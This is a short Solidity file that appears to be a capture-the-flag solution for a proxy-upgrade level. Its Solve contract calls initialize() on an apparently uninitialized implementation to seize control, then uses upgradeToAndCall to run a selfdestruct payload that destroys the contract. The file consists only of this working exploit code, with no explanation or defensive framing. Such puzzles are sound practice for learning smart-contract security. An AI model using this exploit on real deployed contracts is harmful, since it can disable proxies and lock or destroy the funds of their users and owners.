// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0 <=0.8.23;

interface LevelInterface {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
}

contract SelfDestructive {
    function destruct() public {
        selfdestruct(payable(msg.sender));
    }
}

contract Solve {
    constructor(address addr) payable {
        SelfDestructive selfDest = new SelfDestructive();
        LevelInterface level = LevelInterface(addr);

        level.initialize();
        level.upgradeToAndCall(address(selfDest), abi.encodeWithSignature("destruct()"));
    }

    receive() external payable {}
}